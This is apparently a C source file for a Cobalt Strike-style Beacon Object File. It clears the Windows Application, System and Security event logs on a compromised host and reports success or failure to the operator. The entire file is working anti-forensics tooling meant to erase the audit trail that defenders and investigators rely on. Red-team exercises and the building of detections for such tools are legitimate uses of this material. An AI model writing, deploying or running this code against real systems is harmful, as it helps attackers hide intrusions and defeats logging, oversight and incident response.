/*
 * cleareventlog - clear the Application, System and Security event logs.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void clear_log(const char *name)
{
    HANDLE h = ADVAPI32$OpenEventLogA(NULL, name);
    if (!h) {
        BeaconPrintf(CALLBACK_ERROR, "  %-12s open failed: %lu\n", name,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }
    if (ADVAPI32$ClearEventLogA(h, NULL))
        BeaconPrintf(CALLBACK_OUTPUT, "  %-12s cleared\n", name);
    else
        BeaconPrintf(CALLBACK_ERROR, "  %-12s clear failed: %lu\n", name,
                     (unsigned long)KERNEL32$GetLastError());
    ADVAPI32$CloseEventLog(h);
}

void go(char *args, int alen)
{
    (void)args; (void)alen;
    BeaconPrintf(CALLBACK_OUTPUT, "Clearing event logs...\n");
    clear_log("Application");
    clear_log("System");
    clear_log("Security");
}
